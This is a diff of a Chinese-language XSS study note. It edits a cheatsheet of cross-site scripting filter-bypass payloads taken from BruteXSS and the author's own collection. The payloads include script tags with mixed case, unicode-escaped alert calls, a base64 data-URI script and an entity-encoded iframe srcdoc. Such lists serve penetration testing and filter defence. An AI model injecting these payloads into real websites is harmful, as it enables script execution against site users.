@@ -83,8 +83,8 @@ js中會用正規表達式來過濾危險字符，參考如下文件：
 ```
 
 ## Cheatsheet
-```js
-</script>"><script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
+```php
+</script>"><script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>         // 協議解析
 </script>"><script>prompt(1)</script>
 </ScRiPt>"><ScRiPt>prompt(1)</ScRiPt>
 "><script>al\u0065rt(document.domain)</script>
@@ -113,7 +113,7 @@ js中會用正規表達式來過濾危險字符，參考如下文件：
 "><iframe srcdoc="&lt;img src&equals;x:x onerror&equals;alert&lpar;1&rpar;&gt;">
 "><h1/ondrag=co\u006efir\u006d`1`)>DragMe</h1>
 ```
-The cheatsheet include brutexss original payload and my collection!  
+上面的cheatsheet除了有brutexss原有的payload還有一些自己蒐集的!  
 
 ## Reference
 1. The Web Application Hacker's Handbook  
